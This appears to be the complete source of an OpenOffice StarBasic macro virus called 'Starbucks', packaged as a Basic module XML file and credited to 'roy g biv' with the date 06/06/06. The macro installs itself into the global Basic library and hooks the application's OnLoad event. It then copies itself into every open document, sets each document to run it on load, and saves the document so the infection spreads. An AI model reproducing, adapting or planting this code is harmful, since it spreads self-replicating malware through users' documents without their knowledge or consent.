<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="starbucks" script:language="StarBasic">REM  *****  BASIC  *****

 Sub Starbucks &apos;roy g biv - 06/06/06
     a = GlobalScope.BasicLibraries.getByName(&quot;Standard&quot;)
     b = &quot;Starbucks&quot;
     c = BasicLibraries.getByName(&quot;Standard&quot;).getByName(b)
     dim d(1) as new com.sun.star.beans.PropertyValue
     d(0).name = &quot;EventType&quot;
     d(0).value = &quot;StarBasic&quot;
     d(1).name = &quot;Script&quot;
     e = &quot;macro://&quot;
     f = &quot;/Standard.&quot; + b + &quot;.&quot; + b + &quot;()&quot;
     d(1).value = e + f
     if not a.hasByName(b) then
         a.insertByName b, c
         createUnoService(&quot;com.sun.star.frame.GlobalEventBroadcaster&quot;).Events.replaceByName &quot;OnLoad&quot;, d()
     end if
     d(1).value = e + &quot;.&quot; + f
     e = createUnoService(&quot;com.sun.star.frame.Desktop&quot;).getComponents.createEnumeration
     on error goto skip
     while e.hasMoreElements
         f = e.nextElement
         g = f.BasicLibraries.getByName(&quot;Standard&quot;)
         if not g.hasByName(b) then
             g.insertByName b, c
             f.Events.replaceByName &quot;OnLoad&quot;, d()
             f.store
         end if
     skip:
     wend
     End Sub
</script:module>